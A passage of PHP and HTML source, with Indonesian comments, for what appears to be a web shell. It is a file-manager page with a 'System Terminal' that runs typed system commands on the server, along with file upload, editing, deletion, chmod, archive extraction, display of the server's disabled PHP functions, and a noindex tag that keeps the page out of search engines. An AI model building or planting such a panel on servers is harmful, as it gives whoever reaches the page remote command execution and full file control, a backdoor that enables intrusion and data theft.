        if (changePermissions($itemPath, $permissions)) {
            $message = 'Permission berhasil diubah!';
            $messageType = 'success';
        } else {
            $message = 'Gagal mengubah permission! Periksa permission.';
            $messageType = 'error';
        }
    } else {
        $message = 'Item tidak ditemukan atau permission tidak valid!';
        $messageType = 'error';
    }
}

// Baca direktori
$items = [];
if (is_dir($currentDir)) {
    $items = scandir($currentDir);
    $items = array_diff($items, ['.', '..']);
}

// Sort item: folder dulu, baru file
usort($items, function($a, $b) use ($currentDir) {
    $aIsDir = is_dir($currentDir . '/' . $a);
    $bIsDir = is_dir($currentDir . '/' . $b);
    
    if ($aIsDir && !$bIsDir) return -1;
    if (!$aIsDir && $bIsDir) return 1;
    return strnatcasecmp($a, $b);
});

// Breadcrumb navigation
$relativePath = getRelativePath($currentDir);
$paths = array_filter(explode('/', $relativePath));
$breadcrumb = '<a href="?dir=" class="text-blue-600 hover:text-blue-800"><i class="fas fa-home mr-1"></i> Root</a>';
$pathSoFar = '';
foreach ($paths as $path) {
    $pathSoFar .= ($pathSoFar ? '/' : '') . $path;
    $breadcrumb .= ' / <a href="?dir=' . urlencode($pathSoFar) . '" class="text-blue-600 hover:text-blue-800">' . sanitizeInput($path) . '</a>';
}

// Dapatkan informasi disable functions
$disabledFunctions = ini_get('disable_functions');
$disabledFunctionsList = !empty($disabledFunctions) ? explode(',', $disabledFunctions) : [];
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title><?php echo APP_NAME; ?> - <?php echo sanitizeInput(getRelativePath($currentDir)); ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .file-item:hover {
            background-color: rgba(59, 130, 246, 0.05);
        }
        .terminal {
            font-family: 'Fira Code', 'Courier New', monospace;
            background-color: #0d1117;
            color: #c9d1d9;
        }
        .terminal-input {
            background-color: transparent;
            border: none;
            color: #c9d1d9;
            outline: none;
            font-family: inherit;
        }
        .modal {
            transition: opacity 0.3s ease;
        }
        .breadcrumb-separator::after {
            content: '/';
            margin: 0 0.5rem;
            color: #6b7280;
        }
        .code-editor {
            font-family: 'Fira Code', 'Courier New', monospace;
            tab-size: 4;
        }
    </style>
</head>
<body class="bg-gray-50 min-h-screen">
    <!-- Header -->
    <header class="bg-white shadow-sm border-b">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-16">
                <div class="flex items-center">
                    <i class="fas fa-server text-blue-600 text-2xl mr-3"></i>
                    <h1 class="text-xl font-semibold text-gray-800"><?php echo APP_NAME; ?></h1>
                </div>
                <div class="flex items-center space-x-4">
                    <span class="text-sm text-gray-500">
                        <i class="fas fa-user-shield mr-1"></i> System Admin
                    </span>
                    <a href="?logout=1&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" class="text-red-500 hover:text-red-700">
                        <i class="fas fa-sign-out-alt mr-1"></i> Logout
                    </a>
                </div>
            </div>
        </div>
    </header>
    <!-- Main Content -->
    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <!-- Path Navigator -->
        <div class="bg-white rounded-lg shadow-sm p-4 mb-6">
            <div class="flex items-center">
                <span class="text-sm text-gray-600 mr-2 font-medium">Current Path:</span>
                <div class="flex-1">
                    <form method="get" class="flex">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <input type="text" name="dir" value="<?php echo sanitizeInput(getRelativePath($currentDir)); ?>" 
                               class="flex-1 px-3 py-2 border border-gray-300 rounded-l-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm font-mono">
                        <button type="submit" class="bg-blue-600 text-white px-4 py-2 rounded-r-md hover:bg-blue-700">
                            <i class="fas fa-folder-open"></i>
                        </button>
                    </form>
                </div>
            </div>
            <div class="text-sm text-gray-600 mt-2 flex items-center">
                <i class="fas fa-map-marker-alt mr-2 text-blue-500"></i>
                <?php echo $breadcrumb; ?>
            </div>
        </div>
        <!-- Notifications -->
        <?php if (!empty($message)): ?>
            <div class="mb-6 px-4 py-3 rounded <?php echo $messageType === 'success' ? 'bg-green-50 border border-green-200 text-green-800' : 'bg-red-50 border border-red-200 text-red-800'; ?>">
                <div class="flex items-center">
                    <i class="fas <?php echo $messageType === 'success' ? 'fa-check-circle text-green-500' : 'fa-exclamation-circle text-red-500'; ?> mr-2"></i>
                    <?php echo $message; ?>
                </div>
            </div>
        <?php endif; ?>
        
        <!-- Modal Konfirmasi Edit File Biner -->
        <?php if (isset($editNonTextFile)): ?>
            <div class="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full z-50 modal">
                <div class="relative top-20 mx-auto p-5 border w-96 shadow-lg rounded-md bg-white">
                    <div class="mt-3 text-center">
                        <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-yellow-100">
                            <i class="fas fa-exclamation-triangle text-yellow-600"></i>
                        </div>
                        <h3 class="text-lg leading-6 font-medium text-gray-900 mt-4">Edit File Biner</h3>
                        <div class="mt-2 px-7 py-3">
                            <p class="text-sm text-gray-500">
                                File "<?php echo sanitizeInput($editNonTextFile); ?>" bukan file teks. Mengedit file biner dapat merusak file. Apakah Anda ingin melanjutkan?
                            </p>
                        </div>
                        <div class="items-center px-4 py-3">
                            <a href="?dir=<?php echo urlencode(getRelativePath($currentDir)); ?>&edit=<?php echo urlencode($editNonTextFile); ?>&force=1&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" 
                               class="px-4 py-2 bg-red-500 text-white text-base font-medium rounded-md w-full shadow-sm hover:bg-red-600 focus:outline-none focus:ring-2 focus:ring-red-300">
                                Ya, Edit sebagai Teks
                            </a>
                            <a href="?dir=<?php echo urlencode(getRelativePath($currentDir)); ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" 
                               class="mt-3 px-4 py-2 bg-gray-300 text-gray-800 text-base font-medium rounded-md w-full shadow-sm hover:bg-gray-400 focus:outline-none focus:ring-2 focus:ring-gray-300">
                                Batal
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        <?php endif; ?>
        
        <!-- Cek parameter force untuk edit file biner -->
        <?php if (isset($_GET['edit']) && isset($_GET['force']) && $_GET['force'] == 1 && isset($_GET['csrf_token']) && $_GET['csrf_token'] === $_SESSION['csrf_token']): ?>
            <?php
            $editFile = $_GET['edit'];
            // Gunakan path absolut dari root
            $filePath = validatePath(ROOT_PATH . '/' . $editFile);
            
            if (is_file($filePath) && is_readable($filePath)) {
                $fileContent = file_get_contents($filePath);
                $editingFile = $editFile;
            }
            ?>
        <?php endif; ?>
        
        <!-- File Editor Modal -->
        <?php if (isset($editingFile)): ?>
            <div class="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full z-50 modal">
                <div class="relative top-10 mx-auto p-5 border w-5/6 shadow-lg rounded-md bg-white">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="text-lg font-medium text-gray-900">
                            <i class="fas fa-edit mr-2 text-blue-600"></i>
                            Edit File: <?php echo sanitizeInput($editingFile); ?>
                        </h3>
                        <a href="?dir=<?php echo urlencode(getRelativePath($currentDir)); ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" 
                           class="text-gray-400 hover:text-gray-600">
                            <i class="fas fa-times text-xl"></i>
                        </a>
                    </div>
                    <form method="post">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <input type="hidden" name="filename" value="<?php echo sanitizeInput($editingFile); ?>">
                        <textarea name="file_content" rows="25" 
                                  class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 font-mono text-sm code-editor"><?php echo htmlspecialchars($fileContent); ?></textarea>
                        <div class="flex justify-between items-center mt-4">
                            <span class="text-sm text-gray-500">
                                Path: <?php echo sanitizeInput(getRelativePath($currentDir) . '/' . $editingFile); ?>
                            </span>
                            <div class="space-x-3">
                                <a href="?dir=<?php echo urlencode(getRelativePath($currentDir)); ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" 
                                   class="px-4 py-2 bg-gray-300 text-gray-800 rounded-md hover:bg-gray-400">
                                    <i class="fas fa-times mr-1"></i> Batal
                                </a>
                                <button type="submit" name="save_file" 
                                        class="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700">
                                    <i class="fas fa-save mr-1"></i> Simpan
                                </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        <?php endif; ?>
        <!-- CHMOD Modal -->
        <div id="chmodModal" class="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full hidden modal">
            <div class="relative top-20 mx-auto p-5 border w-96 shadow-lg rounded-md bg-white">
                <div class="mt-3">
                    <h3 class="text-lg font-medium text-gray-900 mb-4">
                        <i class="fas fa-lock mr-2 text-yellow-600"></i>
                        Ubah Permission
                    </h3>
                    <form method="post">
                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                        <input type="hidden" name="chmod" value="1">
                        <input type="hidden" id="chmod_item" name="chmod_item" value="">
                        <div class="mb-4">
                            <label for="permissions" class="block text-sm font-medium text-gray-700 mb-1">Permission (misal: 0755)</label>
                            <input type="text" id="permissions" name="permissions" pattern="[0-7]{3,4}" maxlength="4" required
                                   class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                            <p class="mt-1 text-xs text-gray-500">Masukkan permission dalam format oktal (contoh: 0755)</p>
                        </div>
                        <div class="flex justify-end space-x-3">
                            <button type="button" onclick="closeChmodModal()" 
                                    class="px-4 py-2 bg-gray-300 text-gray-800 rounded-md hover:bg-gray-400">
                                <i class="fas fa-times mr-1"></i> Batal
                            </button>
                            <button type="submit" 
                                    class="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700">
                                <i class="fas fa-check mr-1"></i> Simpan
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <!-- Terminal -->
        <div class="bg-gray-900 rounded-lg shadow-sm p-4 mb-6">
            <div class="flex items-center justify-between mb-3">
                <h3 class="text-white font-medium flex items-center">
                    <i class="fas fa-terminal mr-2 text-green-400"></i>
                    System Terminal
                </h3>
                <div class="flex space-x-2">
                    <span class="text-xs text-gray-400">
                        <i class="fas fa-folder mr-1"></i> <?php echo sanitizeInput(getRelativePath($currentDir)); ?>
                    </span>
                    <button onclick="clearTerminal()" class="text-gray-400 hover:text-white text-xs">
                        <i class="fas fa-trash mr-1"></i> Clear
                    </button>
                </div>
            </div>
            <div id="terminalOutput" class="terminal h-48 overflow-y-auto p-3 rounded mb-3 text-sm whitespace-pre-wrap">
                <?php echo htmlspecialchars($terminalOutput); ?>
            </div>
            <form method="post" class="flex items-center">
                <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                <span class="text-green-400 mr-2 font-mono">$</span>
                <input type="text" name="terminal_command" 
                       class="terminal-input flex-1" 
                       placeholder="Ketik perintah sistem..."
                       autocomplete="off">
                <button type="submit" class="ml-2 text-gray-400 hover:text-white">
                    <i class="fas fa-arrow-right"></i>
                </button>
            </form>
        </div>
        <!-- Actions -->
        <div class="bg-white rounded-lg shadow-sm p-4 mb-6">
            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                <!-- Upload File -->
                <form method="post" enctype="multipart/form-data" class="flex-1">
                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                    <div class="flex items-center">
                        <input type="file" name="file" class="flex-1 py-2 px-3 border border-gray-300 rounded-l-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                        <button type="submit" class="bg-blue-600 text-white py-2 px-4 rounded-r-md hover:bg-blue-700">
                            <i class="fas fa-upload mr-1"></i> Upload
                        </button>
                    </div>
                </form>
                
                <!-- Create Folder -->
                <form method="post" class="flex-1">
                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                    <div class="flex items-center">
                        <input type="text" name="dirname" placeholder="Nama folder baru" required
                               class="flex-1 py-2 px-3 border border-gray-300 rounded-l-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                        <button type="submit" name="mkdir" class="bg-green-600 text-white py-2 px-4 rounded-r-md hover:bg-green-700">
                            <i class="fas fa-folder-plus mr-1"></i> Buat Folder
                        </button>
                    </div>
                </form>
                
                <!-- Create File -->
                <form method="post" class="flex-1">
                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                    <div class="flex items-center">
                        <input type="text" name="filename" placeholder="Nama file baru" required
                               class="flex-1 py-2 px-3 border border-gray-300 rounded-l-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                        <button type="submit" name="createfile" class="bg-purple-600 text-white py-2 px-4 rounded-r-md hover:bg-purple-700">
                            <i class="fas fa-file-plus mr-1"></i> Buat File
                        </button>
                    </div>
                </form>
            </div>
            
            <!-- Paste Button (if clipboard has content) -->
            <?php if ($_SESSION['clipboard']['action']): ?>
                <div class="mt-4">
                    <a href="?dir=<?php echo urlencode(getRelativePath($currentDir)); ?>&paste=1&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" 
                       class="flex items-center justify-center w-full py-2 px-4 bg-purple-600 text-white rounded-md hover:bg-purple-700">
                        <i class="fas fa-paste mr-1"></i> 
                        <?php echo $_SESSION['clipboard']['action'] === 'copy' ? 'Salin' : 'Pindah'; ?> 
                        <?php echo sanitizeInput($_SESSION['clipboard']['item_name']); ?>
                    </a>
                </div>
            <?php endif; ?>
        </div>
        <!-- System Info -->
        <div class="bg-white rounded-lg shadow-sm p-4 mb-6">
            <h3 class="text-lg font-medium text-gray-900 mb-3">
                <i class="fas fa-info-circle mr-2 text-blue-600"></i>
                Informasi Sistem
            </h3>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <h4 class="text-sm font-medium text-gray-700 mb-2">PHP Configuration</h4>
                    <div class="text-sm text-gray-600 space-y-1">
                        <p><span class="font-medium">Version:</span> <?php echo phpversion(); ?></p>
                        <p><span class="font-medium">Memory Limit:</span> <?php echo ini_get('memory_limit'); ?></p>
                        <p><span class="font-medium">Max Execution Time:</span> <?php echo ini_get('max_execution_time'); ?>s</p>
                        <p><span class="font-medium">Upload Max Filesize:</span> <?php echo ini_get('upload_max_filesize'); ?></p>
                        <p><span class="font-medium">Post Max Size:</span> <?php echo ini_get('post_max_size'); ?></p>
                    </div>
                </div>
                <div>
                    <h4 class="text-sm font-medium text-gray-700 mb-2">Disabled Functions</h4>
                    <div class="text-sm text-gray-600 max-h-32 overflow-y-auto mb-3">
                        <?php if (empty($disabledFunctionsList)): ?>
                            <p>Tidak ada fungsi yang di-disable</p>
                        <?php else: ?>
                            <div class="flex flex-wrap gap-1">
                                <?php foreach ($disabledFunctionsList as $func): ?>
                                    <span class="bg-red-100 text-red-800 text-xs px-2 py-1 rounded"><?php echo trim($func); ?></span>
                                <?php endforeach; ?>
                            </div>
                        <?php endif; ?>
                    </div>
                    
                    <!-- Tambahkan legenda warna folder -->
                    <h4 class="text-sm font-medium text-gray-700 mb-2">Folder Color Legend</h4>
                    <div class="text-sm text-gray-600 space-y-1">
                        <div class="flex items-center">
                            <i class="fas fa-folder text-blue-600 mr-2"></i>
                            <span>Root Directory</span>
                        </div>
                        <div class="flex items-center">
                            <i class="fas fa-folder text-green-600 mr-2"></i>
                            <span>Writable Directory</span>
                        </div>
                        <div class="flex items-center">
                            <i class="fas fa-folder text-gray-600 mr-2"></i>
                            <span>Read-only Directory</span>
                        </div>
                        <div class="flex items-center">
                            <i class="fas fa-folder text-red-600 mr-2"></i>
                            <span>Restricted Directory</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- File List -->
        <div class="bg-white rounded-lg shadow-sm overflow-hidden">
            <div class="overflow-x-auto">
                <table class="min-w-full divide-y divide-gray-200">
                    <thead class="bg-gray-50">
                        <tr>
                            <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Nama</th>
                            <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Ukuran</th>
                            <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Permissons</th>
                            <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Owner</th>
                            <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Terakhir Diubah</th>
                            <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Aksi</th>
                        </tr>
                    </thead>
                    <tbody class="bg-white divide-y divide-gray-200">
                        <?php if (empty($items)): ?>
                            <tr>
                                <td colspan="6" class="px-6 py-8 text-center text-gray-500">
                                    <i class="fas fa-folder-open text-4xl text-gray-300 mb-2"></i>
                                    <p>Folder kosong</p>
                                </td>
                            </tr>
                        <?php else: ?>
                            <?php foreach ($items as $item): ?>
                                <?php
                                $itemPath = $currentDir . '/' . $item;
                                $isDir = is_dir($itemPath);
                                $itemSize = $isDir ? '-' : formatSize(filesize($itemPath));
                                $itemPerms = substr(sprintf('%o', fileperms($itemPath)), -4);
                                $itemOwner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($itemPath))['name'] : 'unknown';
                                $itemDate = formatDate(filemtime($itemPath));
                                
                                // Dapatkan kelas warna untuk folder
                                $folderColorClass = $isDir ? getFolderColorClass($itemPath) : '';
                                
                                // Jika folder, gunakan ikon dengan warna yang sesuai
                                if ($isDir) {
                                    $itemIcon = 'fa-folder ' . $folderColorClass;
                                } else {
                                    $itemIcon = getFileIcon($item);
                                }
                                
                                // Gunakan path absolut untuk navigasi folder
                                $itemUrl = $isDir ? '?dir=' . urlencode($currentDir . '/' . $item) : $itemPath;
                                $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                                
                                // Cek apakah file bisa dilihat di browser
                                $isViewable = !$isDir && isViewableInBrowser($itemPath);
                                
                                // Dapatkan path relatif dari root untuk link operasi
                                $relativeItemPath = getRelativePath($itemPath);
                                ?>
                                <tr class="file-item hover:bg-gray-50">
                                    <td class="px-6 py-4 whitespace-nowrap">
                                        <div class="flex items-center">
                                            <i class="fas <?php echo $itemIcon; ?> text-xl mr-3"></i>
                                            <?php if ($isDir): ?>
                                                <a href="<?php echo htmlspecialchars($itemUrl); ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" 
                                                   class="font-medium <?php echo $folderColorClass; ?>">
                                                    <?php echo sanitizeInput($item); ?>
                                                </a>
                                            <?php else: ?>
                                                <span class="font-medium"><?php echo sanitizeInput($item); ?></span>
                                            <?php endif; ?>
                                        </div>
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        <?php echo $itemSize; ?>
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        <?php echo $itemPerms; ?>
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        <?php echo $itemOwner; ?>
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                                        <?php echo $itemDate; ?>
                                    </td>
                                    <td class="px-6 py-4 whitespace-nowrap text-sm font-medium">
                                        <div class="flex space-x-1">
                                            <?php if ($isDir): ?>
                                                <a href="<?php echo htmlspecialchars($itemUrl); ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" class="text-blue-600 hover:text-blue-900" title="Buka">
                                                    <i class="fas fa-folder-open"></i>
                                                </a>
                                            <?php else: ?>
                                                <?php if ($isViewable): ?>
                                                    <!-- Gunakan path relatif dari root -->
                                                    <a href="?dir=<?php echo urlencode(getRelativePath($currentDir)); ?>&view=<?php echo urlencode($relativeItemPath); ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" 
                                                       class="text-indigo-600 hover:text-indigo-900" title="Lihat">
                                                        <i class="fas fa-eye"></i>
                                                    </a>
                                                <?php endif; ?>
                                                
                                                <!-- Gunakan path relatif dari root -->
                                                <a href="?dir=<?php echo urlencode(getRelativePath($currentDir)); ?>&download=<?php echo urlencode($relativeItemPath); ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" 
                                                   class="text-blue-600 hover:text-blue-900" title="Download">
                                                    <i class="fas fa-download"></i>
                                                </a>
                                                
                                                <!-- Gunakan path relatif dari root -->
                                                <a href="?dir=<?php echo urlencode(getRelativePath($currentDir)); ?>&edit=<?php echo urlencode($relativeItemPath); ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" class="text-green-600 hover:text-green-900" title="Edit">
                                                    <i class="fas fa-edit"></i>
                                                </a>
                                            <?php endif; ?>
                                            
                                            <?php if ($ext === 'zip' || $ext === 'rar'): ?>
                                                <!-- Gunakan path relatif dari root -->
                                                <a href="?dir=<?php echo urlencode(getRelativePath($currentDir)); ?>&extract=<?php echo urlencode($relativeItemPath); ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" 
                                                   class="text-yellow-600 hover:text-yellow-900" title="Ekstrak">
                                                    <i class="fas fa-file-archive"></i>
                                                </a>
                                            <?php endif; ?>
                                            
                                            <!-- Gunakan path relatif dari root -->
                                            <a href="?dir=<?php echo urlencode(getRelativePath($currentDir)); ?>&copy=<?php echo urlencode($relativeItemPath); ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" 
                                               class="text-yellow-600 hover:text-yellow-900" title="Salin">
                                                <i class="fas fa-copy"></i>
                                            </a>
                                            
                                            <!-- Gunakan path relatif dari root -->
                                            <a href="?dir=<?php echo urlencode(getRelativePath($currentDir)); ?>&cut=<?php echo urlencode($relativeItemPath); ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" 
                                               class="text-orange-600 hover:text-orange-900" title="Potong">
                                                <i class="fas fa-cut"></i>
                                            </a>
                                            
                                            <!-- Kirim path relatif ke modal chmod -->
                                            <button onclick="showChmodModal('<?php echo addslashes($relativeItemPath); ?>')" class="text-purple-600 hover:text-purple-900" title="CHMOD">
                                                <i class="fas fa-lock"></i>
                                            </button>
                                            
                                            <!-- Kirim path relatif ke modal rename -->
                                            <button onclick="showRenameModal('<?php echo addslashes($relativeItemPath); ?>')" class="text-gray-600 hover:text-gray-900" title="Rename">
                                                <i class="fas fa-pen"></i>
                                            </button>
                                            
                                            <!-- Gunakan path relatif dari root -->
                                            <a href="?dir=<?php echo urlencode(getRelativePath($currentDir)); ?>&delete=<?php echo urlencode($relativeItemPath); ?>&csrf_token=<?php echo $_SESSION['csrf_token']; ?>" 
                                               onclick="return confirm('Apakah Anda yakin ingin menghapus <?php echo addslashes($item); ?>?')" 
                                               class="text-red-600 hover:text-red-900" title="Delete">
                                                <i class="fas fa-trash"></i>
                                            </a>
                                        </div>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </main>
    <!-- Rename Modal -->
    <div id="renameModal" class="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full hidden modal">
        <div class="relative top-20 mx-auto p-5 border w-96 shadow-lg rounded-md bg-white">
            <div class="mt-3">
                <h3 class="text-lg font-medium text-gray-900 mb-4">
                    <i class="fas fa-pen mr-2 text-yellow-600"></i>
                    Rename File/Folder
                </h3>
                <form method="post">
                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                    <input type="hidden" name="rename" value="1">
                    <input type="hidden" id="oldname" name="oldname" value="">
                    <div class="mb-4">
                        <label for="newname" class="block text-sm font-medium text-gray-700 mb-1">Nama Baru</label>
                        <input type="text" id="newname" name="newname" required
                               class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                        <p class="mt-1 text-xs text-gray-500">Nama tidak boleh mengandung karakter: / : * ? " < > |</p>
                    </div>
                    <div class="flex justify-end space-x-3">
                        <button type="button" onclick="closeRenameModal()" 
                                class="px-4 py-2 bg-gray-300 text-gray-800 rounded-md hover:bg-gray-400">
                            <i class="fas fa-times mr-1"></i> Batal
                        </button>
                        <button type="submit" 
                                class="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700">
                            <i class="fas fa-check mr-1"></i> Simpan
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <script>
        function showRenameModal(oldname) {
            document.getElementById('oldname').value = oldname;
            // Ambil hanya nama file/folder dari path lengkap
            document.getElementById('newname').value = oldname.split('/').pop(); 
            document.getElementById('renameModal').classList.remove('hidden');
        }
        
        function closeRenameModal() {
            document.getElementById('renameModal').classList.add('hidden');
        }
        
        function showChmodModal(item) {
            document.getElementById('chmod_item').value = item;
            document.getElementById('permissions').value = '';
            document.getElementById('chmodModal').classList.remove('hidden');
        }
        
        function closeChmodModal() {
            document.getElementById('chmodModal').classList.add('hidden');
        }
        
        function clearTerminal() {
            document.getElementById('terminalOutput').textContent = '';
        }
        
        // Auto scroll terminal
        const terminalOutput = document.getElementById('terminalOutput');
        terminalOutput.scrollTop = terminalOutput.scrollHeight;
        
        // Keyboard shortcut for terminal focus
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 't') {
                e.preventDefault();
                document.querySelector('input[name="terminal_command"]').focus();
            }
        });
        
        // Handle tab key in code editor
        document.addEventListener('DOMContentLoaded', function() {
            const codeEditor = document.querySelector('.code-editor');
            if (codeEditor) {
                codeEditor.addEventListener('keydown', function(e) {
                    if (e.key === 'Tab') {
                        e.preventDefault();
                        const start = this.selectionStart;
                        const end = this.selectionEnd;
                        this.value = this.value.substring(0, start) + '    ' + this.value.substring(end);
                        this.selectionStart = this.selectionEnd = start + 4;
                    }
                });
            }
        });
    </script>
</body>
</html>